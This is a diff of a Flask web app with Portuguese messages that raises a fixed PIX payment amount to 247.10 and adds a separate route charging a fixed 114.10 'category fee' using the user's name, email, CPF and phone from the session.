@@ -198,19 +198,53 @@ def pagamento():
             'email': user_data['email'],
             'cpf': user_data['cpf'],
             'phone': user_data['phone'],
-            'amount': 114.10  # Valor fixo para todas as categorias
+            'amount': 247.10  # Soma das duas taxas: 128,40 + 118,70
         }
 
         pix_data = payment_api.create_pix_payment(payment_data)
         return render_template('pagamento.html',
                            pix_data=pix_data,
-                           valor_total="114,10",
+                           valor_total="247,10",
                            current_year=datetime.now().year)
 
     except Exception as e:
         logger.error(f"Erro ao gerar pagamento: {e}")
         flash('Erro ao gerar o pagamento. Por favor, tente novamente.')
         return redirect(url_for('index'))
+
+@app.route('/pagamento_categoria', methods=['POST'])
+def pagamento_categoria():
+    user_data = session.get('user_data')
+    if not user_data:
+        flash('Sessão expirada. Por favor, faça a consulta novamente.')
+        return redirect(url_for('index'))
+
+    categoria = request.form.get('categoria')
+    if not categoria:
+        flash('Categoria não especificada.')
+        return redirect(url_for('obrigado'))
+
+    try:
+        payment_api = create_payment_api()
+        payment_data = {
+            'name': user_data['name'],
+            'email': user_data['email'],
+            'cpf': user_data['cpf'],
+            'phone': user_data['phone'],
+            'amount': 114.10  # Valor fixo para taxa de categoria
+        }
+
+        pix_data = payment_api.create_pix_payment(payment_data)
+        return render_template('pagamento_categoria.html',
+                           pix_data=pix_data,
+                           valor_total="114,10",
+                           categoria=categoria,
+                           current_year=datetime.now().year)
+
+    except Exception as e:
+        logger.error(f"Erro ao gerar pagamento da categoria: {e}")
+        flash('Erro ao gerar o pagamento. Por favor, tente novamente.')
+        return redirect(url_for('obrigado'))
 
 @app.route('/check_payment/<payment_id>')
 def check_payment(payment_id):
